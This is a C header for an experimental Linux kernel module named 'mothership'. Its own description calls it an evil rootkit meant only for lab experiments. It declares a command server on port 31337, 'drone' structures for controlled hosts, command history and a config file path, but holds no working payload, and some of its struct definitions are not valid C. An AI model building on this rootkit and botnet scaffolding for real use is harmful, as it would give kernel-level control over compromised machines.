/*

@author Alexander Bjornsrud <alexanderbjornsrud@gmail.com>
@file definitions.h
@brief All the different struct and function definitions. For cleanlyness.

*/

#ifndef __define_h__
    #define __define_h__
#endif

#define VERBOSE 1
#define MODULE_NAME "mothership"
#define MAX_CON 16
#define D_PORT 31337


MODULE_LICENSE("GPL");        
MODULE_AUTHOR("Alexander Bjørnsrud");   
MODULE_DESCRIPTION("This is an experimental program intentionally designed to do evil things.\n"
				   "It is not designed to be outside a lab\n"
				   "If the folder name Rootkit did not tip you of please google the term.\n"
				   "This module should not be used by anyone for any purpouse exept controlled labratory experiments."); 

MODULE_VERSION("0.1");    

static int dev_open_all(struct inode*,struct file*);
static int dev_close_all(struct inode*,struct file*);
static ssize_t dev_read_all(struct file*,char*,size_t,loff_t*);
static ssize_t dev_write_all(struct file*,const char*,size_t,loff_t*);
static ssize_t dev_write(struct file* file,const char* buff,size_t size ,loff_t *offset);

int file_open(struct configFile *conf);
void file_close(struct file *file);
int file_read(struct configFile *conf);
int file_write(struct configFile *conf);
int history_open(struct history *hist);
int history_close(struct history *hist);
int history_read(struct history *hist);
int history_write(struct history *hist);


struct history {
	char *cmd[];
	char *response[];
	struct confOps ops;
};

struct server {
    int running;
	struct device_out dev;
	struct connection con;
};

struct connection{
	int connected;
	int port;
	struct sockaddr_in *addr;
	struct socket *com;
};

struct device_out {
    char *name;
    dev_t device;
	int major;
	int minor;
    struct cdev cdev; 
    struct file_operations fops;
	struct class *_class;
	struct device *dev;
};

struct drones {
	int count;
	struct drone *drones;
};

struct drone {
	char *name;
	struct connection con;
	struct device_out dev;
};

struct confOps {
	int (*config_file_read)(struct configFile *conf);
	int (*config_file_write)(struct configFile *conf);
	int (*config_file_open)(struct configFile *conf);
	void (*config_file_close)(struct configFile *conf);
};

struct configFile {
	char *path="/etc/mother/mother_config";
	int flags;
	int rights=700;
	struct file *filp = NULL;
	
	struct drones content;
	struct server server;
	struct confOps fops;

} conf;


